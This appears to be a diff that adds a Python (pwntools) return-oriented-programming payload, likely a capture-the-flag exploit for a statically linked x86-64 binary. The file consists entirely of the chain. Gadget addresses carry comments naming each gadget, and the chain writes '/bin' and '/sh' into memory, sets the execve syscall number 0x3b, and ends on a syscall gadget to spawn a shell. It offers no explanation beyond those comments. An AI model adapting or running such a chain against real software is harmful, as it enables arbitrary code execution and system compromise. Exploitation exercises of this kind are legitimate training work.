@@ -1,0 +1,33 @@
+payload = p64(0x4011ad)
+#0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x494238)+p64(0x40e1d2)
+# 0x000000000040e1d2: pop rbx; ret; 
+payload += p64(0x80)+p64(0x4011ac)
+# 0x4011ac: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x494095)+p64(0x40e1d2)
+# 0x000000000040e1d2: pop rbx; ret; 
+payload += p64(0x6e69622f)+p64(0x4011ac)
+# 0x4011ac: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x494099)+p64(0x40e1d2)
+# 0x000000000040e1d2: pop rbx; ret; 
+payload += p64(0x68662f)+p64(0x4011ac)
+# 0x4011ac: add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x47e9e0)
+# 0x47e9e0: pop rsi ; retf
+payload += p64(0x0)+p32(0x4891d0)+p32(0x33)
+# 0x00000000004891d0: pop rax; ret 4; 
+payload += p64(0x494188)+p64(0x47c405)+"\x00"*4
+# 0x000000000047c405: pop rdi; add byte ptr [rax], al; ret; 
+payload += p64(0x494058)+p64(0x4891d0)
+# 0x00000000004891d0: pop rax; ret 4; 
+payload += p64(0x36b94010)+p64(0x401314)+"\x00"*4
+# 0x0000000000401314: add edx, dword ptr [rax - 0x366ffe15]; ret; 
+payload += p64(0x4891d0)
+# 0x00000000004891d0: pop rax; ret 4; 
+payload += p64(0x3b)+p64(0x487911)+"\x00"*4
+# 0x0000000000487911: syscall; 
+payload += b''
